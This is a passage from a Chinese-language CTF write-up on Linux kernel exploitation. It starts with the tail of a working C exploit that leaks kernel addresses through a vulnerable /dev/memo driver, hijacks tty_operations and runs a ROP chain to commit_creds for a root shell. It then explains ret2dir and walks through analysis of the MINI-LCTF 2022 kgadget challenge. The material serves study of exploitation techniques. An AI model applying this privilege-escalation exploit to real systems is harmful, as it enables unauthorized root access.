class="hljs-type">int</span> core)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    <span class="hljs-built_in">CPU_ZERO</span>(&amp;cpu_set);<br>    <span class="hljs-built_in">CPU_SET</span>(core, &amp;cpu_set);<br>    <span class="hljs-built_in">sched_setaffinity</span>(<span class="hljs-built_in">getpid</span>(), <span class="hljs-built_in">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!]Debug here!&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * save the process current context</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;</span>);<br>&#125;<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">get_rootshell</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;Priviledge elevation failed!&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> tty_fd;<br><span class="hljs-type">size_t</span> memo_chunk_addr;<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> fake_tty_ops;<br><span class="hljs-type">size_t</span> *rop;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x400</span>];<br>    <span class="hljs-built_in">saveStatus</span>();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Leaking the kernel heap addr...&quot;</span>);<br>    dev_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/memo&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(dev_fd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;Allocate memo failed...&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">lseek</span>(dev_fd, <span class="hljs-number">0x300</span>, SEEK_CUR) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;lseek failed!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">read</span>(dev_fd, buf, <span class="hljs-number">0x400</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;read failed!&quot;</span>);<br>    &#125;<br> <br>    memo_chunk_addr =*(<span class="hljs-type">size_t</span> *)&amp;buf[<span class="hljs-number">0x100</span>] - <span class="hljs-number">0x800</span>;<br>    <span class="hljs-built_in">PRINT_ADDR</span>(<span class="hljs-string">&quot;memo_chunk_addr&quot;</span>, memo_chunk_addr);<br><br>    <span class="hljs-built_in">info_log</span>(<span class="hljs-string">&quot;[*]Leaking the kernel_base...&quot;</span>);<br>    tty_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x400</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">lseek</span>(dev_fd, <span class="hljs-number">0x300</span>, SEEK_SET) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;lseek failed!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">read</span>(dev_fd, buf, <span class="hljs-number">0x400</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;read failed!&quot;</span>);<br>    &#125;<br><br>    kernel_offset = *(<span class="hljs-type">size_t</span> *)&amp;buf[<span class="hljs-number">0x118</span>] - PTM_UNIX98_OPS;<br>    <span class="hljs-built_in">PRINT_ADDR</span>(<span class="hljs-string">&quot;kernel_offset&quot;</span>, kernel_offset);<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">lseek</span>(dev_fd, <span class="hljs-number">0</span>, SEEK_SET) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;lseek failed&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">lseek</span>(dev_fd, <span class="hljs-number">0x300</span>, SEEK_SET) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;lseek)failed&quot;</span>);<br>    &#125;<br><br>    fake_tty_ops = memo_chunk_addr + <span class="hljs-number">0x300</span>;<br>    *(<span class="hljs-type">size_t</span> *)&amp;(buf[<span class="hljs-number">0x118</span>]) =  fake_tty_ops;<br>    *(<span class="hljs-type">size_t</span> *)&amp;(buf[<span class="hljs-number">0x60</span>]) = LEAVE_RET + kernel_offset;<br>    *(<span class="hljs-type">size_t</span> *)&amp;(buf[<span class="hljs-number">0x108</span>]) = ADD_RSP_0X28_RET + kernel_offset;<br><br>    rop = (<span class="hljs-type">size_t</span> *)&amp;(buf[<span class="hljs-number">0x138</span>]);    <br>    rop[index++] = POP_RDI_RET + kernel_offset;<br>    rop[index++] = <span class="hljs-number">0</span>;<br>    rop[index++] = PREPARE_KERNEL_CRED + kernel_offset;<br>    rop[index++] = MOV_RDI_RAX_RET + kernel_offset;<br>    rop[index++] = COMMIT_CREDS + kernel_offset;<br>    rop[index++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMDOE + kernel_offset;<br>    rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    rop[index++] = (<span class="hljs-type">size_t</span>)get_rootshell;<br>    rop[index++] = user_cs;<br>    rop[index++] = user_rflags;<br>    rop[index++] = user_sp+<span class="hljs-number">8</span>;<br>    rop[index++] = user_ss;<br><br>    <br><br>    <span class="hljs-built_in">write</span>(dev_fd, buf, <span class="hljs-built_in">sizeof</span>(buf));<br>    <span class="hljs-built_in">ioctl</span>(tty_fd, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="二、Kernel-ret2dir"><a href="#二、Kernel-ret2dir" class="headerlink" title="二、Kernel ret2dir"></a>二、Kernel ret2dir</h1><h2 id="0-ret2dir原理"><a href="#0-ret2dir原理" class="headerlink" title="0.ret2dir原理"></a>0.ret2dir原理</h2><p>ret2dir的存在是为了解决SMAP&#x2F;SMEP保护模式的一种手法，该保护模式是阻止了内核程序执行用户程序，第一次被提出是在14年的一篇论文，这里页给出链接</p><p><a href="https://cs.brown.edu/~vpk/papers/ret2dir.sec14.pdf">ret2dir原论文</a><br>首先我们得知道一下Linux内存中的基本布局，链接如下，有兴趣的同学可以自行观看</p><p><a href="https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt">Linux 内存布局</a></p><p>我们可以看到有以下一个区域</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">========================================================================================================================<br>    Start addr    |<span class="hljs-string">   Offset   </span>|<span class="hljs-string">     End addr     </span>|<span class="hljs-string">  Size   </span>|<span class="hljs-string"> VM area description</span><br><span class="hljs-string">========================================================================================================================</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000000000000000 |<span class="hljs-string">    0       </span>|<span class="hljs-string"> 00007fffffffffff </span>|<span class="hljs-string">  128 TB </span>|<span class="hljs-string"> user-space virtual memory, different per mm</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000800000000000 |<span class="hljs-string"> +128    TB </span>|<span class="hljs-string"> ffff7fffffffffff </span>|<span class="hljs-string"> ~16M TB </span>|<span class="hljs-string"> ... huge, almost 64 bits wide hole of non-canonical</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     virtual memory addresses up to the -128 TB</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     starting offset of kernel mappings.</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Kernel-space virtual memory, shared between all processes:</span><br><span class="hljs-string">____________________________________________________________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffff800000000000 |<span class="hljs-string"> -128    TB </span>|<span class="hljs-string"> ffff87ffffffffff </span>|<span class="hljs-string">    8 TB </span>|<span class="hljs-string"> ... guard hole, also reserved for hypervisor</span><br><span class="hljs-string"> ffff880000000000 </span>|<span class="hljs-string"> -120    TB </span>|<span class="hljs-string"> ffff887fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> LDT remap for PTI</span><br><span class="hljs-string"> ffff888000000000 </span>|<span class="hljs-string"> -119.5  TB </span>|<span class="hljs-string"> ffffc87fffffffff </span>|<span class="hljs-string">   64 TB </span>|<span class="hljs-string"> direct mapping of all physical memory (page_offset_base)</span><br><span class="hljs-string"> ffffc88000000000 </span>|<span class="hljs-string">  -55.5  TB </span>|<span class="hljs-string"> ffffc8ffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffc90000000000 </span>|<span class="hljs-string">  -55    TB </span>|<span class="hljs-string"> ffffe8ffffffffff </span>|<span class="hljs-string">   32 TB </span>|<span class="hljs-string"> vmalloc/ioremap space (vmalloc_base)</span><br><span class="hljs-string"> ffffe90000000000 </span>|<span class="hljs-string">  -23    TB </span>|<span class="hljs-string"> ffffe9ffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffea0000000000 </span>|<span class="hljs-string">  -22    TB </span>|<span class="hljs-string"> ffffeaffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> virtual memory map (vmemmap_base)</span><br><span class="hljs-string"> ffffeb0000000000 </span>|<span class="hljs-string">  -21    TB </span>|<span class="hljs-string"> ffffebffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffec0000000000 </span>|<span class="hljs-string">  -20    TB </span>|<span class="hljs-string"> fffffbffffffffff </span>|<span class="hljs-string">   16 TB </span>|<span class="hljs-string"> KASAN shadow memory</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|____________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Identical layout to the 56-bit one from here on:</span><br><span class="hljs-string">____________________________________________________________</span>|____________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> fffffc0000000000 |<span class="hljs-string">   -4    TB </span>|<span class="hljs-string"> fffffdffffffffff </span>|<span class="hljs-string">    2 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> vaddr_end for KASLR</span><br><span class="hljs-string"> fffffe0000000000 </span>|<span class="hljs-string">   -2    TB </span>|<span class="hljs-string"> fffffe7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> cpu_entry_area mapping</span><br><span class="hljs-string"> fffffe8000000000 </span>|<span class="hljs-string">   -1.5  TB </span>|<span class="hljs-string"> fffffeffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffff0000000000 </span>|<span class="hljs-string">   -1    TB </span>|<span class="hljs-string"> ffffff7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> %esp fixup stacks</span><br><span class="hljs-string"> ffffff8000000000 </span>|<span class="hljs-string"> -512    GB </span>|<span class="hljs-string"> ffffffeeffffffff </span>|<span class="hljs-string">  444 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffef00000000 </span>|<span class="hljs-string">  -68    GB </span>|<span class="hljs-string"> fffffffeffffffff </span>|<span class="hljs-string">   64 GB </span>|<span class="hljs-string"> EFI region mapping space</span><br><span class="hljs-string"> ffffffff00000000 </span>|<span class="hljs-string">   -4    GB </span>|<span class="hljs-string"> ffffffff7fffffff </span>|<span class="hljs-string">    2 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">   -2    GB </span>|<span class="hljs-string"> ffffffff9fffffff </span>|<span class="hljs-string">  512 MB </span>|<span class="hljs-string"> kernel text mapping, mapped to physical address 0</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">-2048    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffffffffa0000000 |<span class="hljs-string">-1536    MB </span>|<span class="hljs-string"> fffffffffeffffff </span>|<span class="hljs-string"> 1520 MB </span>|<span class="hljs-string"> module mapping space</span><br><span class="hljs-string"> ffffffffff000000 </span>|<span class="hljs-string">  -16    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br>    FIXADDR_START |<span class="hljs-string"> ~-11    MB </span>|<span class="hljs-string"> ffffffffff5fffff </span>|<span class="hljs-string"> ~0.5 MB </span>|<span class="hljs-string"> kernel-internal fixmap range, variable size and offset</span><br><span class="hljs-string"> ffffffffff600000 </span>|<span class="hljs-string">  -10    MB </span>|<span class="hljs-string"> ffffffffff600fff </span>|<span class="hljs-string">    4 kB </span>|<span class="hljs-string"> legacy vsyscall ABI</span><br><span class="hljs-string"> ffffffffffe00000 </span>|<span class="hljs-string">   -2    MB </span>|<span class="hljs-string"> ffffffffffffffff </span>|<span class="hljs-string">    2 MB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br><br><br>====================================================<br>Complete virtual memory map with 5-level page tables<br>====================================================<br></code></pre></td></tr></table></figure><p>我们可以看到这一行</p><pre><code class="hljs"> ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</code></pre><p>这里我们通过后面的内存段解释可以知道，他是映射了整个物理地址<br>而这里还有个点就是，再Linux内核当中，分配内存通常有以下两种方式：</p><ol><li>vmalloc, 这里按照页为单位分配，需要虚拟地址连续，物理地址不需要连续</li><li>kmalloc, 这里按照字节为单位分配，虚拟地址和物理地址都需要连续</li></ol><p>而我们通常采用kmalloc进行分配。<br>因此，此时的内存就存在以下的情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d788d43f8794a4c226dfe3e34bf41bd5ac6e397d.jpg"></p><p>在早期，我们的physmap是可执行的，所以我们可以在用户态编写好shellcode，然后在内核态劫持程序流到此就可以实现我们想得到的操作，但是目前的话我们的physmap一般都设置为不可执行，因此我们就无法通过shellcode的方式，但是我们仍然可以通过ROP来得到我们想要的结果<br>所以我们目前的利用手法就是如下：</p><ol><li>在用户态使用mmap来大量映射进行堆喷，这里咱们申请的越多，我们在物理内存当中使用的地址就会越大，而后我们在内核态也能更快的得到我们所期待的重合段</li><li>然后我们在内核态利用漏洞获得堆上的地址，也就是<code>kmalloc</code>后获取到的<code>slab</code>的地址，然后计算出physmap的地址</li><li>利用ROP劫持执行流到physmap上面</li></ol><p>通过上面的手法，我们就可以避开传统的内核访问用户但是被隔绝的情况，此时我们相当于是直接操作物理内存</p><h2 id="1-例题MINI-LCTF-2022-Kgadget"><a href="#1-例题MINI-LCTF-2022-Kgadget" class="headerlink" title="1.例题MINI-LCTF-2022 Kgadget"></a>1.例题MINI-LCTF-2022 Kgadget</h2><p>[md]这里我就奉行拿来主义，给出arttnba3师傅出的题，如有冒犯立马删（胆小</p><p><a href="https://arttnba3.cn/download/minil2022/pwn/kgadget.tar.xz">ret2dir例题</a></p><p>拿到题第一步，首先咱们解压了看看</p><pre><code class="hljs"> tar -Jxf kgadget.tar.xzf</code></pre><p>这个XZ文件有两种解压方式，还有一种就是先解压成tar，再解压tar<br>然后我们获取到文件系统后先来看看init脚本</p><pre><code class="hljs">  1 #!/bin/sh  2 chown -R 0:0 /  3 mount -t tmpfs tmpfs /tmp  4 mount -t proc none /proc  5 mount -t sysfs none /sys  6 mount -t devtmpfs devtmpfs /dev  7   8 echo 1 &gt; /proc/sys/kernel/dmesg_restrict  9 echo 1 &gt; /proc/sys/kernel/kptr_restrict 10  11 chown 0:0 /flag 12 chmod 400 /flag 13 chmod 777 /tmp 14  15 insmod kgadget.ko 16 chmod 777 /dev/kgadget 17  18 cat /root/banner 19 echo -e &quot;\nBoot took $(cut -d&#39; &#39; -f1 /proc/uptime) seconds\n&quot; 20 setsid cttyhack setuidgid 1000 sh                                                                                                                                                                                                 21 poweroff -d 0 -f</code></pre><h2 id="2-IDA逆向"><a href="#2-IDA逆向" class="headerlink" title="2.IDA逆向"></a>2.IDA逆向</h2><p>可以看到其中insmod了一个<code>kgadget.ko</code>，这儿也是咱们的漏洞模块,首先我们使用checksec来查看一下该模块<br><img src="http://imgsrc.baidu.com/forum/pic/item/29381f30e924b8990b9379f02b061d950b7bf64f.jpg"><br>然后我们拖入IDA进行静态分析，首先就是ioctl函数<br><img src="http://imgsrc.baidu.com/forum/pic/item/a686c9177f3e67098b9646377ec79f3df9dc5567.jpg"><br>可以看到这里咱们其实编译会出点问题，所以我们到汇编这里查看</p><pre><code class="hljs">.text.unlikely:000000000000011C 48 8B 1A                      mov     rbx, [param]                    ; 我们传递的函数param.text.unlikely:000000000000011F                               kgadget_ptr = rbx                       ; void (*)(void).text.unlikely:000000000000011F 48 C7 C7 70 03 00 00          mov     __file, offset unk_370.text.unlikely:0000000000000126 48 89 DE                      mov     cmd, kgadget_ptr.text.unlikely:0000000000000129 E8 2A 0F 00 00                call    printk                          ; PIC mode.text.unlikely:0000000000000129.text.unlikely:000000000000012E 48 C7 C7 A0 03 00 00          mov     rdi, offset unk_3A0.text.unlikely:0000000000000135 E8 1E 0F 00 00                call    printk                          ; PIC mode.text.unlikely:0000000000000135.text.unlikely:000000000000013A 48 89 65 E8                   mov     [rbp-18h], rsp.text.unlikely:000000000000013E 48 8B 45 E8                   mov     rax, [rbp-18h].text.unlikely:0000000000000142 48 C7 C7 F8 03 00 00          mov     rdi, offset byte_3F8.text.unlikely:0000000000000149 48 05 00 10 00 00             add     rax, 1000h.text.unlikely:000000000000014F 48 25 00 F0 FF FF             and     rax, 0FFFFFFFFFFFFF000h         ; rax此时为内核栈的栈底，也就是最高处.text.unlikely:0000000000000155 48 8D 90 58 FF FF FF          lea     rdx, [rax-0A8h]                 ; 此时将距离栈底0xA8的位置传入rdx,该rdx所在的地址将会作为一个中断栈，保存中断的寄存器值.text.unlikely:000000000000015C 48 89 55 E8                   mov     [rbp-18h], rdx.text.unlikely:0000000000000160                               regs = rdx                              ; pt_regs *.text.unlikely:0000000000000160 48 BA 61 72 74 74 6E 62 61 33 mov     regs, 3361626E74747261h         ; 无效值.text.unlikely:000000000000016A 48 89 90 58 FF FF FF          mov     [rax-0A8h], rdx                 ; r15.text.unlikely:0000000000000171 48 89 90 60 FF FF FF          mov     [rax-0A0h], rdx                 ; r14.text.unlikely:0000000000000178 48 89 90 68 FF FF FF          mov     [rax-98h], rdx                  ; r13.text.unlikely:000000000000017F 48 89 90 70 FF FF FF          mov     [rax-90h], rdx                  ; r12.text.unlikely:0000000000000186 48 89 90 78 FF FF FF          mov     [rax-88h], rdx                  ; rbp.text.unlikely:000000000000018D 48 89 50 80                   mov     [rax-80h], rdx                  ; rbx.text.unlikely:0000000000000191 48 89 50 90                   mov     [rax-70h], rdx                  ; r10.text.unlikely:0000000000000195 E8 BE 0E 00 00                call    printk                          ; PIC mode.text.unlikely:0000000000000195.text.unlikely:000000000000019A E8 B1 0E 00 00                call    __x86_indirect_thunk_rbx        ; PIC mode</code></pre><p>可以看到一个<code>pt_regs</code> 结构体，我们在这里查看一下这个结构体的含义</p><pre><code class="hljs">struct pt_regs &#123;/* * C ABI says these regs are callee-preserved. They aren&#39;t saved on kernel entry * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;. */        unsigned long r15;        unsigned long r14;        unsigned long r13;        unsigned long r12;        unsigned long rbp;        unsigned long rbx;/* These regs are callee-clobbered. Always saved on kernel entry. */        unsigned long r11;        unsigned long r10;        unsigned long r9;        unsigned long r8;        unsigned long rax;        unsigned long rcx;        unsigned long rdx;        unsigned long rsi;        unsigned long rdi;/* * On syscall entry, this is syscall#. On CPU exception, this is error code. * On hw interrupt, it&#39;s IRQ number: */        unsigned long orig_rax;/* Return frame for iretq */        unsigned long rip;        unsigned long cs;        unsigned long eflags;        unsigned long rsp;        unsigned long ss;/* top of stack page */&#125;;</code></pre><p>由于这里我曾经写过操作系统，所以这里的结构体一眼可以看出是中断发生时所保存的寄存器结构，他是被压在内核栈当中的，然后我们的ioctl函数实际上是将r15~r12、rbp、rbx以及r10置为了无效值，仅仅保留了几个关键寄存器值。<br>然后最后一条语句</p><pre><code class="hljs">.text.unlikely:0000000000000195.text.unlikely:000000000000019A E8 B1 0E 00 00                call    __x86_indirect_thunk_rbx        ; PIC mode</code></pre><p>这里是编译器的优化，实际上等同于<code>call rbx</code>, 而rbx种我们保存的是我们刚刚传递的函数<br>我们分析完ioctl，我们来看看qemu的启动脚本</p><pre><code class="hljs">  1 #!/bin/sh  2 qemu-system-x86_64 \  3   -m 256M \  4   -cpu kvm64,+smep,+smap \  5   -smp cores=2,threads=2 \  6   -kernel bzImage \  7   -initrd ./rootfs.cpio \  8   -nographic \  9   -monitor /dev/null \ 10   -snapshot \ 11   -append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot; \                                                                                                                                                               12   -no-reboot</code></pre><h2 id="3-前期准备"><a href="#3-前期准备" class="headerlink" title="3.前期准备"></a>3.前期准备</h2><p>我们可以看到这里是开启了smep和smap，阻隔了内核访问用户数据或代码，还有就是nokalsr，说明我们可以通过vmlinux来获取关键函数的地址<br>首先我们目前是只拥有<code>bzImage</code>，因此我们通过下面脚本来获取其中的<code>vmlinux</code>，然后来获取关键函数地址</p><ul><li>这里获取vmlinux有两种方法，其中之一就是下面的<code>extract-vmlinux</code>脚本，不过有的地方会有不同程度的失败，要么是无法真正解压，要么是解压出来没有符号表</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0-only</span><br><span class="hljs-comment"># ----------------------------------------------------------------------</span><br><span class="hljs-comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Inspired from extract-ikconfig</span><br><span class="hljs-comment"># (c) 2009,2010 Dick Streefland &lt;[url=mailto:dick@streefland.net]dick@streefland.net[/url]&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (c) 2011      Corentin Chary &lt;[url=mailto:corentin.chary@gmail.com]corentin.chary@gmail.com[/url]&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># ----------------------------------------------------------------------</span><br><br>check_vmlinux()<br>&#123;<br>    <span class="hljs-comment"># Use readelf to check if it&#x27;s a valid ELF</span><br>    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span><br>    <span class="hljs-comment">#       and not just an elf</span><br>    readelf -h $<span class="hljs-number">1</span> &gt; /dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> || <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br>    cat $<span class="hljs-number">1</span><br>    exit <span class="hljs-number">0</span><br>&#125;<br><br>try_decompress()<br>&#123;<br>    <span class="hljs-comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span><br>    <span class="hljs-comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span><br><br>    <span class="hljs-comment"># Try to find the header ($1) and decompress from here</span><br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> `tr <span 